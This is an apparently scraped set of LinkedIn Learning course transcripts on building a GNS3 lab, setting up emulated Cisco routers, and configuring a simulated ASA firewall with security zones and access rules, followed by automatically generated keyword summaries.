> **[2:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=177)** I'll also uncheck the box add an iOS router, as I don't need to use a router at this point, and I'll click finish.
>
> **[3:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=185)** I can close the General Preferences screen and I'll create a new project called My First and press OK.
>
> **[3:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=195)** Let's take a quick tour of the product before we set up our network.
>
> **[3:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=199)** The main screen has a set of icons on the left, the devices toolbar, a menu with icons on the top, the GNS3 toolbar, a couple of summary panels on the right and a consul at the bottom.
>
> **[3:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=212)** The main canvas in the middle is the workspace, where we build our network diagram.
>
> **[3:37](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=217)** The icons on the left represent network components, devices and paths, and include both simulated and emulated devices.
>
> **[3:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=225)** The top icon is for routers, the arrows below for switches, the screen below that for end devices, and the diode icon below that for security devices.
>
> **[3:55](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=235)** The multi part icon below that will show all devices.
>
> **[3:59](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=239)** At the bottom is the icon we use to link the devices together, the cabling if you like.
>
> **[4:04](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=244)** By clicking one of the device icons, we can see the devices registered in GNS3.
>
> **[4:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=250)** I'll click the multi part one to show all devices.
>
> **[4:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=253)** GNS3 provides a small number of generic network devices as standard as we can see, cloud, hubs, switches, hosts, and virtual PCs.
>
> **[4:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=263)** Vendor specific devices have to be imported as images, typically CAMU, VMware, or VirtualBox virtual machines.
>
> **[4:31](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=271)** The menu and it's associated icons at the top provide a range of GNS3 functions.
>
> **[4:36](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=276)** The first group are for creating and managing GNS3 projects, the second group provides operational project capabilities, such as snapshots, labeling, and connecting consuls, the third group provides controls for managing devices, the fourth and final group provides tools to enhance network presentation, such as comment boxes and zone perimeter shapes, zoom controls, and so on.
>
> **[5:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=301)** These all make the presentation much more readable for complex networks.
>
> **[5:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=306)** Okay, let's get a feel for how GNS3 works.
>
> **[5:09](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=309)** I'll drag a couple of virtual PCs onto the main canvas.
>
> **[5:14](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=314)** We can see they're automatically named PC1 and PC2, I'll also drag a hub onto the canvas, and I'll use the connector to join the PCs to the hub.
>
> **[5:31](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=331)** As we do this, we need to specify what interface we'll use.
>
> **[5:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=338)** I can then use the icon in the middle at the top to display interface labels on the canvas.
>
> **[5:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=345)** The run icon to start all devices and the consul icon to open consuls for all of them.
>
> **[5:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=353)** The consul is how we manage the device, it's the same as a wide consul connection on the physical device.
>
> **[5:59](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=359)** I can now go into the consul for each PC and configure its IP address.
>
> **[6:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=370)** And I can use the ping command to ping each PC from the other.
>
> **[6:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=380)** Okay, we've installed GNS3 and created our first project.
>
> **[6:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=385)** We now have code running for two virtual PCs and a hub.
>
> **[6:29](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=389)** We've created our first running, emulated network.

> [!info]- Semantic Content
>
> **Env Vars:** gns3 (16), asa (5), pix (1), camu (1), pc1 (1)
> **Code Keywords:** interface (3), let (3), finally, (1), require (1), this, (1)
> **Prerequisites:** set up (3), configure (2), prerequisite (1)
> **Versions:** version 1 (1), 4.6 (1), version 8 (1), 4.2 (1)
> **Definitions:** is a  (4)
> **Code Identifiers:** ios (3)
> **Analogies:** such as (2)
> **CLI Commands:** make (1)

#### Obtain network device images
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=0)** - [Instructor] GNS3 provides a number of devices as standard.
>
> **[0:04](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=4)** Cloud Ethernet hubs and switches and hosts and virtual PCs.
>
> **[0:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=8)** This allows a generic network to be set up and simulated.
>
> **[0:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=12)** However, for manufacturers specific devices such as firewalls and routers, we need to obtain device images.
>
> **[0:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=19)** Initially GNS3 was developed in order to simulate a Cisco based network.
>
> **[0:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=24)** As a result, one of the main types of images you'll be interested in is the Cisco Product set.
>
> **[0:29](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=29)** The full set of Cisco software can be accessed from the Cisco website using a Cisco support contract.
>
> **[0:36](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=36)** And this is by far the best place to source images.
>
> **[0:39](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=39)** However, unless you work in an organization, which has an existing Cisco contract, obtaining a license to download software for testing may prove difficult.
>
> **[0:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=49)** GNS3 is evolved and now supports other devices such as Juniper routers, a range of Linux based devices and others.
>
> **[0:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=57)** The marketplace site shown here, shows the device that can be run on GNS3 and provides links to the device templates including Cisco.
>
> **[1:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=66)** A number of these devices require the latest version of GNS3 to run, and the number require the devices to be hosted and run on a GNS3 remote server, rather than our local all in one environment.
>
> **[1:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=79)** You can find various network device images for download from a number of other repositories on the internet.
>
> **[1:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=85)** This site provides the ASA 8.4.2 image files as a zip file, as shown here.
>
> **[1:31](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=91)** This consists of a colonel load an initial ram disk.
>
> **[1:35](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=95)** The protech guru site also has a number of devices including Cisco and Juniper routers.
>
> **[1:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=100)** I've taken the 3745 router from the site shown here.
>
> **[1:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=105)** The first thing to do having downloaded the images, is to extract and copy them into an appropriate location.
>
> **[1:51](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=111)** I've created a GNS images folder, So I'll extract my files there.
>
> **[1:55](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=115)** The 3745 image comes as a single binary file, So I'll copy that directly.
>
> **[2:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=126)** The ASA file, is a zip archive, which contains three files.
>
> **[2:09](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=129)** The two files required to the ASA firewall and documentation in the form of a configuration text file.
>
> **[2:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obtain-network-device-images?u=76281980&t=136)** I'll extract the GZ and VM Linux files to the users Malcolm GNS3 images folder.

> [!info]- Semantic Content
>
> **Env Vars:** gns3 (7), asa (3), gns (1)
> **Code Keywords:** require (2)
> **Analogies:** such as (2)
> **Prerequisites:** set up (1), required to (1)
> **CLI Commands:** find (1)
> **Versions:** 8.4.2 (1)
> **Exercise Files:** zip file (1)
> **Definitions:** is a  (1)

#### Set up a network
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=0)** - [Instructor] Let's set up a router network in preparation for using the ASA.
>
> **[0:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=5)** I'll need to create my Cisco router devices from the binary file.
>
> **[0:09](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=9)** To do this, I open the Edit Preferences window.
>
> **[0:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=13)** I can then select Dynamips, IOS routers, and click New.
>
> **[0:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=19)** I'll navigate to my images folder and select the 3745 binary file, and I'll decompress the image.
>
> **[0:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=32)** I'll select c3475 as the router type and accept its defaults.
>
> **[0:37](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=37)** We'll skip the Idle-PC finder for the moment and finish.
>
> **[0:43](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=43)** I'll select the multi-icon symbol and open up the devices pane.
>
> **[0:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=47)** And we can now see that we have a c3745 router.
>
> **[0:51](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=51)** I'll start by putting in a couple of 3745 routers and connect them together.
>
> **[0:55](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=55)** I'll drag them onto the main panel and connect them using the link icon on the left.
>
> **[1:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=61)** I'll connect using Ethernet0 on both routers.
>
> **[1:04](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=64)** I'll add a note to show the first router has an IP address of 10.0.0.1, and the second has an IP address of 10.0.0.2.
>
> **[1:14](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=74)** I'll add a virtual PC endpoint to both routers on their Ethernet1 interfaces.
>
> **[1:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=80)** I'll add notes to each, as well, with their IP addresses of 4.4.4.1 and 1.1.1.1.
>
> **[1:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=87)** I'll select the first router, R1.
>
> **[1:29](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=89)** I'll start it and then open its console.
>
> **[1:36](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=96)** I can press question mark to get a list of commands.
>
> **[1:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=100)** One of the commands we can use is show, and I can display the configuration by entering the show config command.
>
> **[1:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=109)** We can also use the show command to check the router's interfaces.
>
> **[1:55](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=115)** Okay, we need to configure an IP address and address mask and bring up the node slash node interface to talk to the second router.
>
> **[2:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=122)** When configuring the router, we use commands for configuration, and the same command preceded by the word no to indicate we want to remove the configuration.
>
> **[2:11](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=131)** We'll use similar commands to those we used to configure the PIX firewall, but there are differences in this version of iOS.
>
> **[2:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=143)** I'll also add a network onto the 0/1 interface.
>
> **[2:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=154)** Having defined the interfaces, we now need to set up a path through the router.
>
> **[2:44](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=164)** And I'll save this configuration to memory now.
>
> **[2:48](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=168)** Okay, I'll start the virtual PCN point and configure its IP address.
>
> **[2:58](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=178)** I'll save this configuration, and I'll try pinging the router's interface.
>
> **[3:04](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=184)** And we can see we're connected.
>
> **[3:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=186)** Let's do the same for the second router and PC.
>
> **[3:09](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=189)** I'll start the router and open its console.
>
> **[3:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=192)** I'll configure the first interface.
>
> **[3:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=203)** And I'll configure the second interface.
>
> **[3:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=212)** I'll also configure a path through the router.
>
> **[3:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=218)** And I'll save this configuration to memory now.
>
> **[3:44](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=224)** I'll start its virtual PC and configure it.
>
> **[3:54](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=234)** I'll save that, and I'll check it's connected.
>
> **[4:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=240)** I can also, from this PC, ping the first PC.
>
> **[4:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=245)** We've now got a routed network set up and running.
>
> **[4:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=248)** Before leaving this network, we need to set the idle time on the routers to avoid GNS3 consuming all our host processor resource when emulating the network.
>
> **[4:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=258)** We do this by right-clicking each router and selecting the idle time entry, letting GNS3 calculate the list of idle times and then selecting one.
>
> **[4:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=268)** GNS3 may identify a preferred option.
>
> **[4:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-network?u=76281980&t=272)** Otherwise, you may need to experiment with the settings.

> [!info]- Semantic Content
>
> **Prerequisites:** configure (7), set up (3)
> **Code Keywords:** interface (5), let (2), this, (1), new. (1)
> **Env Vars:** gns3 (3), asa (1), ios (1), pix (1), pcn (1)
> **UI Navigation:** select the (3), open the (1), navigate to (1)
> **Versions:** 10.0.0 (2), 4.4.4 (1), 1.1.1 (1)
> **CLI Commands:** node (2)
> **Code Identifiers:** ios (1)
> **Speakers:** - [instructor] (1)

#### Simulate the ASA firewall
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=0)** - [Instructor] Let's now extend the routed network to add in an ASA and create a secure enclave.
>
> **[0:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=6)** There's one item we need to create before setting up the ASA and that's a flash disk which we can subsequently use in the ASA configuration.
>
> **[0:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=15)** I'll put this into a QEMU folder in the images directory.
>
> **[0:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=19)** I'll navigate to my images folder and create the flash drive.
>
> **[0:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=30)** We've got our flash drive and we're ready to go.
>
> **[0:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=33)** I'll next create a GNS3 template to run the ASA as a virtual machine.
>
> **[0:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=38)** I'll select edit, preferences, QEMU Vms and then press new to set up the ASA.
>
> **[0:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=45)** The drop down box allows me to select ASA 8.42 as the type and then press next.
>
> **[0:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=53)** I'll call this ASA01 and make it a binary type of X68_64w and then press next.
>
> **[1:03](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=63)** For the HDA I'll select the flash file we created and then press next.
>
> **[1:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=72)** And then select the initrd file and the vmlinuz file and press finish.
>
> **[1:21](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=81)** Okay.
>
> **[1:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=83)** I'll now drag the ASA onto the main screen.
>
> **[1:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=88)** I'll reroute the 3745 routers to pass through the ASA.
>
> **[1:37](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=97)** I'll connect to ethernet zero on both routers, and ethernet one and ethernet two on the ASA.
>
> **[1:43](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=103)** I'll update the note to show the first router is in a DMZ, and has an ip address of 192.168.1.2 and the second router is in a secure enclave with an ip address of 10.0.0.2.
>
> **[2:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=121)** I'll select the first router console and update the router's configuration by changing the interface to the ASA to be 192.168.1.2, and changing the routing.
>
> **[2:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=144)** I'll change the route to 192.168.1.254 which will assign on the ASA.
>
> **[2:31](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=151)** I'll save this configuration to memory now.
>
> **[2:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=154)** I can leave the second router configuration as it is.
>
> **[2:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=158)** Okay, we know need to configure the ASA to setup the firewall between the two zones.
>
> **[2:43](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=163)** I'll start it up, and open the console.
>
> **[2:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=169)** Okay we have a Cisco ASA prompt now, but we're not logged in.
>
> **[2:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=173)** I can enter priveledged more using the enable command which by default has no password.
>
> **[2:58](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=178)** I now have the Cisco ASA hash privilege prompt.
>
> **[3:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=182)** I can now enter configuration mode.
>
> **[3:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=185)** When I press question mark, I get a list of commands, and we can see there's quite a number of additional commands in the ASA compared to what we saw in the pix.
>
> **[3:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=196)** Let's check the interfaces.
>
> **[3:21](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=201)** We can see we have four gigabit ethernet ports.
>
> **[3:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=204)** We want to configure two of them, and we do that as we did for the routers.
>
> **[3:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=208)** Port one I'll configure as a DMZ, and port two as inside.
>
> **[3:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=218)** I'll use another command called nameif to define this interface as being the DMZ.
>
> **[3:43](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=223)** This sets the security level to zero by default.
>
> **[3:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=227)** I'll change it to 50.
>
> **[3:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=233)** I'll now set the second interface.
>
> **[4:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=245)** I'll save this configuration to memory now, and we can check this by displaying the ip information.
>
> **[4:14](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=254)** I manually changed the DMZ security level to 50, and the inside security level defaulted to 100.
>
> **[4:21](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=261)** While in a real network we'd also configure an outside network with a security level of zero and a route outside traffic through the DMZ.
>
> **[4:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=270)** I won't do that at this time.
>
> **[4:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=272)** We have enough with two interfaces to demonstrate the ASA configuration.
>
> **[4:36](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=276)** I'll ping the two routers.
>
> **[4:41](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=281)** Okay, we can ping out from the ASA.
>
> **[4:44](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=284)** We can automatically pass traffic from a higher to a lower security zone.
>
> **[4:48](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=288)** So going from inside to DMZ will, by default, work.
>
> **[4:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=292)** However, in order to provide controlled access through the firewall from a lower to a higher security zone, we need to setup rules to explicitly permit it.
>
> **[5:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=301)** When we do a ping, we want the reply to come back, so we'll setup the routing and the permissions for the response.
>
> **[5:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=308)** First, I'll set some routes up.
>
> **[5:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=317)** The first DMZ route is an explicit path for packets with destinations in the DMZ.
>
> **[5:22](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=322)** And while these will be routed using the catch all second rule, it's often useful to have specific routes configured.
>
> **[5:29](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=329)** I need to enable ICMP access.
>
> **[5:31](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=331)** I can use a descriptive name for the list rather than just a number.
>
> **[5:35](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=335)** I'll choose DMZ-to-inside to show the connection.
>
> **[5:43](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=343)** I'll again write this configuration to memory.
>
> **[5:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=350)** From the DMZ, I can't see the secure enclave.
>
